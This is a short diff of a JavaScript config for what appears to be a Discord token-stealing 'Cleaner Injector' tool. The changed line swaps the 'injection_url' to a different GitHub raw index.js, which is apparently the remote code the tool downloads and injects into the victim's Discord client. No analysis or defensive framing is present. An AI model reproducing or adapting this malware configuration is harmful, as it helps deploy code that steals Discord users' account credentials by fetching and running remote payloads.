@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Cleaner Injector', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1114654780535619704/1119057175256506468/image.png?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/RealKramp31/injection/main/index.js', 
   /**
    
    **/
